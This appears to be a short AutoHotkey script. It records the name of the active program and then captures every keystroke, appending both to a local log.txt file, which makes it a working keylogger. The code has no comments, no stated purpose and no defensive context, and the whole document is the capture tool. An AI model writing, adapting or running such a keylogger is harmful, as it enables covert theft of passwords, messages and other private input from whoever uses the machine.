Program :=
Loop
{
WinGet, Out, ProcessName, A
if(StrLen(Out) > 0)
{
if(Out != Program)
{
FileAppend, 
(

%Out%
), log.txt
Program = %Out%
}}
Input, Key, L1 B T1 I V
FileAppend,
(

%Key%
), log.txt 
}



